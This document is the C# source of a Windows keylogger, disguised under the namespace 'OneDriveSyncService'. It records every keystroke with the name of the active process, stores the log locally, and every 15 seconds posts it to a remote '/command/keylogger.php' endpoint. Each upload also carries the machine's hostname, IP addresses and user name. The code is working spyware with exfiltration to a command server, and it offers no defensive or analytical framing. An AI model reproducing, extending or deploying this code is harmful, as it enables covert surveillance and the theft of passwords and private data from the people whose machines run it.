using System;
using System.Collections.Generic;
using System.Windows.Input;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Timers;
using System.Threading;
using System.IO;

namespace OneDriveSyncService
{
    internal class Keylogger
    {
        static readonly WebClient webClient = new WebClient();

        static bool isStarted = false;
        private readonly static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
        static readonly System.Timers.Timer timer = new System.Timers.Timer();
        private static readonly object fileLock = new object();
        private static string _serverName;

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        static readonly string path = "keystrokes.txt";
        static string activeProcessName = GetActiveWindowProcessName().ToLower();
        static string prevProcessName = activeProcessName;

        static Thread th_doKeylogger;

        public static void InitClientKeylogger(string serverName)
        {
            _serverName = serverName;
            timer.Interval = 15000;
            timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            timer.Enabled = true;
            timer.Start();

            if (!File.Exists(path))
            {
                lock (fileLock)
                {
                    using (StreamWriter sw = File.CreateText(path))
                    {
                        sw.WriteLine("\r\n[--" + activeProcessName + "--]");
                    }
                }
            }

            th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
            th_doKeylogger.SetApartmentState(ApartmentState.STA);
            th_doKeylogger.Start();
        }

        public static void StartKeylogger()
        {
            isStarted = true;

        }

        public static void StopKeylogger()
        {
            lock (fileLock)
            {
                if (File.Exists(path))
                {
                    try
                    {
                        File.Delete(path);
                    }
                    catch
                    {

                    }
                }
            }
            isStarted = false;
        }

        private static void DoKeylogger()
        {
            while (true)
            {
                Thread.Sleep(5);
                if (!isStarted) continue;

                string keyPressed = GetNewPressedKeys();

                lock (fileLock)
                {
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        activeProcessName = GetActiveWindowProcessName().ToLower();
                        bool isOldProcess = activeProcessName.Equals(prevProcessName);
                        if (!isOldProcess)
                        {
                            sw.WriteLine("\r\n[--" + activeProcessName + "--]");
                            prevProcessName = activeProcessName;
                        }
                        sw.Write(keyPressed);
                    }
                }
            }
        }

        private static string GetNewPressedKeys()
        {
            string pressedKey = string.Empty;

            foreach (int i in Enum.GetValues(typeof(Key)))
            {
                Key key = (Key)Enum.Parse(typeof(Key), i.ToString());

                bool down = false;
                if (key != Key.None)
                {
                    down = Keyboard.IsKeyDown(key);
                }

                if (!down && PressedKeysHistory.Contains(key))
                    PressedKeysHistory.Remove(key);
                else if (down && !PressedKeysHistory.Contains(key))
                {
                    if (!IsCaps())
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString().ToLower();
                    }
                    else
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString();
                    }
                }
            }

            return ReplaceStrings(pressedKey);
        }

        private static bool IsCaps()
        {
            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
            bool isShiftKeyPressed = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;

            return isCapsLockOn || isShiftKeyPressed;
        }

        private static string ReplaceStrings(string input)
        {
            string replacedKey = input;
            switch (input)
            {
                case "space":
                    replacedKey = " ";
                    break;
                case "return":
                    replacedKey = "\r\n";
                    break;
                case "escape":
                    replacedKey = "[ESC]";
                    break;
                case "leftctrl":
                case "rightctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "rightshift":
                case "leftshift":
                    replacedKey = "";
                    break;
                case "back":
                    replacedKey = "[Back]";
                    break;
                case "lWin":
                    replacedKey = "[WIN]";
                    break;
                case "tab":
                    replacedKey = "[Tab]";
                    break;
                case "Capital":
                    replacedKey = "";
                    break;
                case "oemperiod":
                    replacedKey = ".";
                    break;
                case "D1":
                    replacedKey = "!";
                    break;
                case "D2":
                    replacedKey = "@";
                    break;
                case "oemcomma":
                    replacedKey = ",";
                    break;
                case "oem1":
                    replacedKey = ";";
                    break;
                case "Oem1":
                    replacedKey = ":";
                    break;
                case "oem5":
                    replacedKey = "\\";
                    break;
                case "oemquotes":
                    replacedKey = "'";
                    break;
                case "OemQuotes":
                    replacedKey = "\"";
                    break;
                case "oemminus":
                    replacedKey = "-";
                    break;
                case "delete":
                    replacedKey = "[DEL]";
                    break;
                case "oemquestion":
                    replacedKey = "/";
                    break;
                case "OemQuestion":
                    replacedKey = "?";
                    break;
            }

            return replacedKey;
        }

        private static string GetActiveWindowProcessName()
        {
            IntPtr windowHandle = GetForegroundWindow();
            GetWindowThreadProcessId(windowHandle, out uint processId);
            Process process = Process.GetProcessById((int)processId);

            return process.ProcessName;
        }

        static void OnTimedEvent(object sender, ElapsedEventArgs e)
        {
            if (!isStarted) return;
            try
            {
                string payload = "name=" + Dns.GetHostName() + "&keylog=" + GetKeystrokes();
                webClient.Headers.Clear();
                webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                webClient.UploadString(_serverName + "/command/keylogger.php", payload);
            }
            catch
            {
                Thread.Sleep(5000);
            }
        }

        public static string GetKeystrokes()
        {
            lock (fileLock)
            {
                if (!File.Exists(path))
                {
                    return "[No keystrokes recorded yet]";
                }

                string logContents = File.ReadAllText(path);
                string messageBody = "";
                string newLine = Environment.NewLine;

                DateTime now = DateTime.Now;
                var host = Dns.GetHostEntry(Dns.GetHostName());

                messageBody += "IP Addresses:" + newLine;
                foreach (var address in host.AddressList)
                {
                    messageBody += address + newLine;
                }

                messageBody += newLine + "User: " + Environment.UserDomainName + "\\" + Environment.UserName + newLine;
                messageBody += "Time: " + now.ToString() + newLine;
                messageBody += newLine + "--- Keystrokes --- " + newLine + logContents;

                return messageBody;
            }
        }
    }
}
